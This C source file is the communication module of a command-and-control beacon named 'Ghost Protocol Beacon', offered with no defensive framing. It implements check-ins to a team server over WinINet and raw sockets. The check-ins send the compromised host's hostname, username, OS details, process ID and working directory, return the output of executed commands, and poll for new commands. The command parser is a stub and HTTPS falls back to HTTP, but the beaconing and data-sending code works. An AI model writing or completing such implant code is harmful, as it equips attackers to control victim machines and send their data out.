/*
 * Ghost Protocol Beacon - Communication Module Implementation
 * Handles HTTP/HTTPS communication with the team server
 */

#include "communication.h"
#include <ctype.h>

// JSON parsing helpers (simplified)
static char* find_json_value(const char* json, const char* key);
static int parse_commands_json(const char* json, command_t** commands);

int http_checkin(beacon_config_t* config, system_info_t* sysinfo,
                command_result_t* results, int result_count,
                command_t** commands, int* command_count) {
    
    char headers[1024];
    char json_data[MAX_BUFFER_SIZE];
    http_response_t response = {0};
    
    // Build headers
    snprintf(headers, sizeof(headers),
        "User-Agent: %s\r\n"
        "Content-Type: application/json\r\n"
        "X-Beacon-ID: %s\r\n",
        config->user_agent, config->beacon_id);
    
    // Build JSON payload
    if (sysinfo) {
        // Initial checkin with system info
        snprintf(json_data, sizeof(json_data),
            "{"
            "\"beacon_id\":\"%s\","
            "\"timestamp\":\"%s\","
            "\"system_info\":{"
                "\"hostname\":\"%s\","
                "\"username\":\"%s\","
                "\"os_name\":\"%s\","
                "\"os_version\":\"%s\","
                "\"architecture\":\"%s\","
                "\"pid\":%d,"
                "\"cwd\":\"%s\""
            "}"
            "}",
            config->beacon_id,
            "2024-01-01T00:00:00Z", // Placeholder timestamp
            sysinfo->hostname,
            sysinfo->username,
            sysinfo->os_name,
            sysinfo->os_version,
            sysinfo->architecture,
            sysinfo->pid,
            sysinfo->cwd);
    } else if (results && result_count > 0) {
        // Checkin with command results
        int offset = snprintf(json_data, sizeof(json_data),
            "{"
            "\"beacon_id\":\"%s\","
            "\"timestamp\":\"%s\","
            "\"command_results\":[",
            config->beacon_id,
            "2024-01-01T00:00:00Z");
        
        for (int i = 0; i < result_count && offset < sizeof(json_data) - 256; i++) {
            offset += snprintf(json_data + offset, sizeof(json_data) - offset,
                "%s{"
                "\"command_id\":\"%s\","
                "\"success\":%s,"
                "\"output\":\"%s\","
                "\"timestamp\":\"%s\""
                "}",
                i > 0 ? "," : "",
                results[i].command_id,
                results[i].success ? "true" : "false",
                results[i].output,
                results[i].timestamp);
        }
        
        snprintf(json_data + offset, sizeof(json_data) - offset, "]}");
    } else {
        // Regular checkin
        snprintf(json_data, sizeof(json_data),
            "{"
            "\"beacon_id\":\"%s\","
            "\"timestamp\":\"%s\""
            "}",
            config->beacon_id,
            "2024-01-01T00:00:00Z");
    }
    
    // Make HTTP request
    const char* method = (sysinfo || (results && result_count > 0)) ? "POST" : "GET";
    const char* data = (sysinfo || (results && result_count > 0)) ? json_data : NULL;
    
    int result = http_request(method, config->server_url, headers, data, &response);
    
    if (result == 0 && response.status_code == 200 && response.data) {
        // Parse response for commands
        *command_count = parse_commands_json(response.data, commands);
        
        // Free response data
        free(response.data);
        return 0;
    }
    
    if (response.data) {
        free(response.data);
    }
    
    return -1;
}

int https_checkin(beacon_config_t* config, system_info_t* sysinfo,
                 command_result_t* results, int result_count,
                 command_t** commands, int* command_count) {
    
    char headers[1024];
    char json_data[MAX_BUFFER_SIZE];
    http_response_t response = {0};
    
    // Build headers (same as HTTP)
    snprintf(headers, sizeof(headers),
        "User-Agent: %s\r\n"
        "Content-Type: application/json\r\n"
        "X-Beacon-ID: %s\r\n",
        config->user_agent, config->beacon_id);
    
    // Build JSON payload (same as HTTP)
    if (sysinfo) {
        snprintf(json_data, sizeof(json_data),
            "{"
            "\"beacon_id\":\"%s\","
            "\"timestamp\":\"%s\","
            "\"system_info\":{"
                "\"hostname\":\"%s\","
                "\"username\":\"%s\","
                "\"os_name\":\"%s\","
                "\"os_version\":\"%s\","
                "\"architecture\":\"%s\","
                "\"pid\":%d,"
                "\"cwd\":\"%s\""
            "}"
            "}",
            config->beacon_id,
            "2024-01-01T00:00:00Z",
            sysinfo->hostname,
            sysinfo->username,
            sysinfo->os_name,
            sysinfo->os_version,
            sysinfo->architecture,
            sysinfo->pid,
            sysinfo->cwd);
    } else {
        snprintf(json_data, sizeof(json_data),
            "{"
            "\"beacon_id\":\"%s\","
            "\"timestamp\":\"%s\""
            "}",
            config->beacon_id,
            "2024-01-01T00:00:00Z");
    }
    
    // Make HTTPS request
    const char* method = sysinfo ? "POST" : "GET";
    const char* data = sysinfo ? json_data : NULL;
    
    int result = https_request(method, config->server_url, headers, data, &response, config->verify_ssl);
    
    if (result == 0 && response.status_code == 200 && response.data) {
        *command_count = parse_commands_json(response.data, commands);
        free(response.data);
        return 0;
    }
    
    if (response.data) {
        free(response.data);
    }
    
    return -1;
}

#ifdef _WIN32
int http_request(const char* method, const char* url, const char* headers,
                const char* data, http_response_t* response) {
    
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    int result = -1;
    
    // Parse URL
    char hostname[256];
    int port;
    char path[512];
    int use_ssl;
    
    if (parse_url(url, hostname, &port, path, &use_ssl) != 0) {
        return -1;
    }
    
    // Initialize WinINet
    hInternet = InternetOpenA("Ghost Protocol Beacon", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) goto cleanup;
    
    // Connect to server
    hConnect = InternetConnectA(hInternet, hostname, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) goto cleanup;
    
    // Create request
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (use_ssl) {
        flags |= INTERNET_FLAG_SECURE;
    }
    
    hRequest = HttpOpenRequestA(hConnect, method, path, NULL, NULL, NULL, flags, 0);
    if (!hRequest) goto cleanup;
    
    // Send request
    BOOL sent = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, data ? strlen(data) : 0);
    if (!sent) goto cleanup;
    
    // Get status code
    DWORD statusCode;
    DWORD statusCodeSize = sizeof(statusCode);
    if (HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, NULL)) {
        response->status_code = statusCode;
    }
    
    // Read response
    char buffer[4096];
    DWORD bytesRead;
    response->data = malloc(1);
    response->size = 0;
    
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        response->data = realloc(response->data, response->size + bytesRead + 1);
        memcpy(response->data + response->size, buffer, bytesRead);
        response->size += bytesRead;
    }
    
    if (response->data) {
        response->data[response->size] = '\0';
    }
    
    result = 0;
    
cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    
    return result;
}

int https_request(const char* method, const char* url, const char* headers,
                 const char* data, http_response_t* response, int verify_ssl) {
    // For Windows, HTTPS is handled by the same function with SSL flag
    return http_request(method, url, headers, data, response);
}

#else

// Unix/Linux implementation using raw sockets
int http_request(const char* method, const char* url, const char* headers,
                const char* data, http_response_t* response) {
    
    char hostname[256];
    int port;
    char path[512];
    int use_ssl;
    
    if (parse_url(url, hostname, &port, path, &use_ssl) != 0) {
        return -1;
    }
    
    // Create socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return -1;
    }
    
    // Resolve hostname
    struct hostent* host = gethostbyname(hostname);
    if (!host) {
        close(sockfd);
        return -1;
    }
    
    // Connect to server
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    memcpy(&server_addr.sin_addr.s_addr, host->h_addr, host->h_length);
    
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return -1;
    }
    
    // Build HTTP request
    char request[MAX_BUFFER_SIZE];
    int request_len = snprintf(request, sizeof(request),
        "%s %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "%s"
        "Connection: close\r\n"
        "\r\n",
        method, path, hostname, headers);
    
    if (data) {
        request_len += snprintf(request + request_len, sizeof(request) - request_len, "%s", data);
    }
    
    // Send request
    if (send(sockfd, request, request_len, 0) < 0) {
        close(sockfd);
        return -1;
    }
    
    // Read response
    char buffer[4096];
    response->data = malloc(1);
    response->size = 0;
    int bytes_received;
    
    while ((bytes_received = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
        response->data = realloc(response->data, response->size + bytes_received + 1);
        memcpy(response->data + response->size, buffer, bytes_received);
        response->size += bytes_received;
    }
    
    if (response->data) {
        response->data[response->size] = '\0';
        
        // Parse status code from response
        char* status_line = strstr(response->data, "HTTP/1.1 ");
        if (status_line) {
            response->status_code = atoi(status_line + 9);
        }
    }
    
    close(sockfd);
    return 0;
}

int https_request(const char* method, const char* url, const char* headers,
                 const char* data, http_response_t* response, int verify_ssl) {
    // Simplified HTTPS implementation - in a real implementation,
    // you would use OpenSSL or similar library
    // For now, fall back to HTTP (not secure!)
    printf("Warning: HTTPS not fully implemented, falling back to HTTP\n");
    return http_request(method, url, headers, data, response);
}

#endif

int parse_url(const char* url, char* hostname, int* port, char* path, int* use_ssl) {
    *use_ssl = 0;
    *port = 80;
    
    const char* start = url;
    
    // Check protocol
    if (strncmp(url, "http://", 7) == 0) {
        start = url + 7;
        *port = 80;
    } else if (strncmp(url, "https://", 8) == 0) {
        start = url + 8;
        *port = 443;
        *use_ssl = 1;
    }
    
    // Find end of hostname
    const char* path_start = strchr(start, '/');
    const char* port_start = strchr(start, ':');
    
    // Extract hostname
    int hostname_len;
    if (port_start && (!path_start || port_start < path_start)) {
        hostname_len = port_start - start;
        *port = atoi(port_start + 1);
    } else if (path_start) {
        hostname_len = path_start - start;
    } else {
        hostname_len = strlen(start);
    }
    
    strncpy(hostname, start, hostname_len);
    hostname[hostname_len] = '\0';
    
    // Extract path
    if (path_start) {
        strcpy(path, path_start);
    } else {
        strcpy(path, "/");
    }
    
    return 0;
}

static int parse_commands_json(const char* json, command_t** commands) {
    // Simplified JSON parsing for commands array
    // In a real implementation, use a proper JSON library
    
    char* commands_start = strstr(json, "\"commands\":[");
    if (!commands_start) {
        *commands = NULL;
        return 0;
    }
    
    // For now, return empty command list
    // Full JSON parsing would be implemented here
    *commands = NULL;
    return 0;
}
